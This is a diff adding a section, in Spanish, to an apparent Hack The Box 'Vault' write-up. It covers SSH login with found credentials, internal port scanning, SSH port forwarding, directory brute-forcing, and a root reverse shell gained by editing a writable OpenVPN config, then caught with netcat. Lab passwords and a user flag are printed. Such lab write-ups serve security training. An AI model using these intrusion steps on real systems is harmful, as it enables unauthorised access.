@@ -235,3 +235,138 @@ Parece que he conseguido unas credenciales para acceder al servidor mediante SSH
 SSH
 ------
 
+Accedo con las siguientes credenciales a través de SSH dave:Dav3therav3123. Entrando al directorio 'Desktop', observo tres ficheros interesantes. El fichero 'ssh' que ya se vio su contenido en la sección anterior y los otros dos ficheros, 'key' y 'Servers' cuyo contenido se puede ver a continuación.<br/>
+
+    ┌──(root㉿kali)-[/home/nico/htb/vault]
+    └─# ssh dave@10.10.10.109                                                                             
+    dave@10.10.10.109's password: 
+    Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64)
+
+    * Documentation:  https://help.ubuntu.com
+    * Management:     https://landscape.canonical.com
+    * Support:        https://ubuntu.com/advantage
+
+    222 packages can be updated.
+    47 updates are security updates.
+
+    Last login: Sun Sep  2 07:17:32 2018 from 192.168.1.11
+    dave@ubuntu:~$ cd Desktop
+    dave@ubuntu:~/Desktop$ ls -lah
+    total 20K
+    drwxr-xr-x  2 dave dave 4.0K Jun  2  2021 .
+    drwxr-xr-x 18 dave dave 4.0K Jun  2  2021 ..
+    -rw-rw-r--  1 alex alex   14 Jul 17  2018 key
+    -rw-rw-r--  1 alex alex   74 Jul 17  2018 Servers
+    -rw-rw-r--  1 alex alex   20 Jul 17  2018 ssh
+    dave@ubuntu:~/Desktop$ cat key
+    itscominghome
+    dave@ubuntu:~/Desktop$ cat Servers
+    DNS + Configurator - 192.168.122.4
+    Firewall - 192.168.122.5
+    The Vault - x
+
+Voy a realizar un escaneo con netcat a la dirección que se encuentra en el fichero 'Servers'. En principio parece que sirve como enrutador o algo parecido.<br/>
+
+    dave@ubuntu:~/Desktop$ nc -vz 192.168.122.4 1-100
+    Connection to 192.168.122.4 22 port [tcp/ssh] succeeded!
+    Connection to 192.168.122.4 80 port [tcp/http] succeeded!
+
+Consigo una respuesta satisfactoria con los puertos 22 y 80 referentes a SSH y HTTP respectivamente como ya bien conocemos.<br/>
+
+    ┌──(root㉿kali)-[/home/nico/htb/vault]
+    └─# ssh -L 8000:192.168.122.4:80 dave@10.10.10.109                                                    
+    dave@10.10.10.109's password: 
+    Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64)
+
+    * Documentation:  https://help.ubuntu.com
+    * Management:     https://landscape.canonical.com
+    * Support:        https://ubuntu.com/advantage
+
+    222 packages can be updated.
+    47 updates are security updates.
+
+    Last login: Sun Feb  4 08:01:12 2024 from 10.10.14.22
+    dave@ubuntu:~$
+
+Investigando un poco, pude obtener el siguiente comando el cual me confirma que el servicio SSH es usado para enrutar el puerto 80 de la dirección 192.168.122.4 al puerto 8000 en la máquina local. Voy a probar a conectarme a mi puerto 8000 a ver si es correcto.<br/>
+
+DNS
+------
+
+Obtengo la siguiente interfaz que me permite editar y probar un fichero de configuración de OpenVPN.<br/>
+
+<img src='/images/portfolio/vault/dns.png' width='900' height=auto><br/><br/>
+
+<img src='/images/portfolio/vault/ovpn.png' width='900' height=auto><br/><br/>
+
+Voy a realizar un escaneo con gobuster a ver si consigo encontrar algo.<br/>
+
+    ┌──(root㉿kali)-[/home/nico/htb/vault]
+    └─# gobuster dir --url http://127.0.0.1:8000/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt     
+    ===============================================================
+    Gobuster v3.6
+    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+    ===============================================================
+    [+] Url:                     http://127.0.0.1:8000/
+    [+] Method:                  GET
+    [+] Threads:                 10
+    [+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+    [+] Negative Status codes:   404
+    [+] User Agent:              gobuster/3.6
+    [+] Timeout:                 10s
+    ===============================================================
+    Starting gobuster in directory enumeration mode
+    ===============================================================
+    /.hta                 (Status: 403) [Size: 290]
+    /.htaccess            (Status: 403) [Size: 295]
+    /.htpasswd            (Status: 403) [Size: 295]
+    /index.php            (Status: 200) [Size: 195]
+    /notes                (Status: 200) [Size: 36]
+    /server-status        (Status: 403) [Size: 299]
+    Progress: 4723 / 4724 (99.98%)
+    ===============================================================
+    Finished
+    ===============================================================
+
+Obtengo un fichero llamado 'notes'. Vamos a ver que contiene.<br/>
+
+<img src='/images/portfolio/vault/notes.png' width='900' height=auto><br/><br/>
+
+Resulta ser un registro de cambio de permisos sobre el fichero con extensión '.ovpn' obteniendo los permisos '777'. Esto me asegura que el usuario 'www-data' es capaz de modificar dicho fichero. Investigando un poco acerca de los ficheros de configuración de OpenVPN, me topé con un artículo (https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da) que enseñaba como abrir un reverse shell a través de estos ficheros de configuración. El código viene recogido a continuación.<br/>
+
+<img src='/images/portfolio/vault/shellScript.png' width='900' height=auto><br/><br/>
+
+Utilizando el puerto de escucha 9001 en el SSH ejecutado anteriormente, obtengo finalmente acceso como usuario root y consigo el flag de usuario.<br/>
+
+    dave@ubuntu:~/Desktop$ nc -lvnp 9001
+    Listening on [0.0.0.0] (family 0, port 9001)
+    Connection from [192.168.122.4] port 9001 [tcp/*] accepted (family 2, sport 60170)
+    bash: cannot set terminal process group (1094): Inappropriate ioctl for device
+    bash: no job control in this shell
+    root@DNS:/var/www/html# whoami
+    whoami
+    root
+    root@DNS:/var/www/html# cd /home
+    cd /home
+    root@DNS:/home# ls
+    ls
+    alex
+    dave
+    root@DNS:/home# cd dave
+    cd dave
+    root@DNS:/home/dave# ls
+    ls
+    ssh
+    user.txt
+    root@DNS:/home/dave# cat user.txt
+    cat user.txt
+    a4947faa8d4e1f80771d34234bd88c73
+
+También obtengo las credenciales ssh de dave.<br/>
+
+    root@DNS:/home/dave# cat ssh
+    cat ssh
+    dave
+    dav3gerous567
+
+
